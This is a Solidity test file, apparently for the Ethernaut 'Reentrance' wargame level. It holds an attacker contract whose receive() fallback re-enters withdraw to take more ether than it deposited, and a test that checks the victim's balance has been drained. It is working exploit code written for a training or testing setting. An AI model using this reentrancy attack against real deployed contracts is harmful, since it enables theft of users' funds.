// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "../src/Reentrance.sol";

interface CheatVm {
    function deal(address who, uint256 newBalance) external;
}

contract EthernautReentryActor {
    Reentrance public victim;
    uint256 public callbacks;
    constructor(address payable target) public { victim = Reentrance(target); }
    function fund() external payable { victim.donate{value: msg.value}(address(this)); }
    function attack() external { victim.withdraw(1 ether); }
    receive() external payable {
        if (callbacks < 1 && address(victim).balance >= 1 ether) {
            callbacks += 1;
            victim.withdraw(1 ether);
        }
    }
}

contract EthernautReentranceTest {
    CheatVm constant vm = CheatVm(address(uint160(uint256(keccak256("hevm cheat code")))));

    function testOfficialEthernautReentrance() public {
        vm.deal(address(this), 10 ether);
        Reentrance victim = new Reentrance();
        victim.donate{value: 2 ether}(address(this));
        EthernautReentryActor actor = new EthernautReentryActor(payable(address(victim)));
        actor.fund{value: 1 ether}();
        require(address(victim).balance == 3 ether, "setup victim");
        actor.attack();
        require(actor.callbacks() == 1, "no nested reentry");
        require(address(actor).balance == 2 ether, "no extra withdrawal");
        require(address(victim).balance == 1 ether, "victim not drained");
    }
}
